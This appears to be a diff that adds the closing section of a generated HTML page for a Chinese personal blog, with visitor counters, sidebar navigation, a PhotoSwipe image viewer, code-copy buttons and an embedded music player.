+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/haoyun.ico" alt="小透的少年江湖"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="http://shenyu-vip.lofter.com">摄影</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>让我给大家分享喜悦吧！</p>
+  <div class="reward-box">
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/%E5%BE%AE%E4%BF%A1.png">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+ 
+<script src="/js/clickBoom2.js"></script>
+ 
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="86"
+        src="//music.163.com/outchain/player?type=2&id=1858011775&auto=1&height=66"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+    
+
+  </div>
+</body>
+
+</html>
